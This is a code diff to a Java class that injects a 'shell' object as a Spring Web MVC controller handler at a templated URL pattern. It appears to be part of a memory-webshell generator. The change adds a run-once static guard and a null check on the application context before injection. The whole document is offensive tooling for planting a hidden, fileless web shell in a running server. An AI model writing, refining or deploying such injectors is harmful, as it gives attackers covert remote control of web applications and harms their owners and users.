@@ -17,6 +17,7 @@ import java.util.zip.GZIPInputStream;
 public class SpringWebMvcControllerHandlerInjector {
 
     private String msg = "";
+    private static boolean ok = false;
 
     public String getUrlPattern() {
         return "{{urlPattern}}";
@@ -31,20 +32,28 @@ public class SpringWebMvcControllerHandlerInjector {
     }
 
     public SpringWebMvcControllerHandlerInjector() {
+        if (ok) {
+            return;
+        }
         Object context = null;
         try {
             context = getContext();
         } catch (Throwable e) {
             msg += "context error: " + getErrorMessage(e);
         }
-        try {
-            Object shell = getShell();
-            msg += "context: [" + context + "] ";
-            inject(context, shell);
-            msg += "[" + getUrlPattern() + "] ready\n";
-        } catch (Throwable e) {
-            msg += "failed " + getErrorMessage(e) + "\n";
+        if (context == null) {
+            msg += "context not found";
+        } else {
+            try {
+                Object shell = getShell();
+                msg += "context: [" + context + "] ";
+                inject(context, shell);
+                msg += "[" + getUrlPattern() + "] ready\n";
+            } catch (Throwable e) {
+                msg += "failed " + getErrorMessage(e) + "\n";
+            }
         }
+        ok = true;
         System.out.println(msg);
     }
 
